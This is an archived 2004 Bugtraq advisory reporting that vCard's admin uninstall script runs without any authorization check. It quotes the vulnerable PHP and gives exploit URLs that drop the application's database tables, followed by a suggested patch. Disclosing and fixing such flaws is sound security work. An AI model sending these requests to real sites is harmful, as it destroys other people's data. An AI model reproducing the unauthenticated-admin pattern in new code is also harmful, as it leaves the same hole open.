=== Content from marc.info_140ac4f9_20250125_065203.html ===

```
[[prev in list](?l=bugtraq&m=107956175021980&w=2)] [[next in list](?l=bugtraq&m=107956772024551&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Vcard 2.8 uninstall script problem
From:       [saudi linux <ksa2ksa () yahoo ! com>](?a=107957326200005&r=1&w=2)
Date:       [2004-03-17 22:21:38](?l=bugtraq&r=1&w=2&b=200403)
Message-ID: [20040317222138.13812.qmail () search ! securityfocus ! com](?i=20040317222138.13812.qmail%20()%20search%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=107957312531199&q=mbox) or [body](?l=bugtraq&m=107957312531199&q=raw)]

Informations :
°°°°°°°°°°°°°°
Procduct: Vcard
Version : 2.9 may other VER
Problems : File uninstall & delete the table

PHP Code/Location :
°°°°°°°°°°°°°°°°°°°
/admin/uninstall.php :
------------------------------------------------------------------------
[...]

<?
$step = $HTTP_GET_VARS['step'];
if (empty($step))
{
    echo "<p><b>Are you sure, uninstall vCard database tables and them contents?</b></p>";
    echo "<p>Yes, I'm sure. <a href='$PHP_SELF?step=2'>Click here to continue --></a></p>";
}

if ($step == 2)
{
	include "./config.inc.php";
	include("./db_mysql.inc.php");
	include("./functions.inc.php");

	$DB_site = new DB_Sql_vc;
	$DB_site->server = $hostname;
	$DB_site->user = $dbUser;
	$DB_site->password = $dbPass;
	$DB_site->database = $dbName;
	$DB_site->connect();
	$dbPass = "";
	$DB_site->password = "";

	//*********************************************
	$DB_site->query("DROP TABLE IF EXISTS vcard_abook ");
	$DB_site->query("DROP TABLE IF EXISTS vcard_account ");
?>

As u can see the script does not Check User Authorization

Exploit:
°°°°°°°°°°
http://[target]/[Vcard folder]/admin/uninstall.php

or

http://[target]/[Vcard folder]/admin/uninstall.php?step=2

patch:
°°°°°°°°°°
remove uninstall.php and protect admin folder by .htaccess

Saudi Linux
KSA o0 KSA 0o

[[prev in list](?l=bugtraq&m=107956175021980&w=2)] [[next in list](?l=bugtraq&m=107956772024551&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


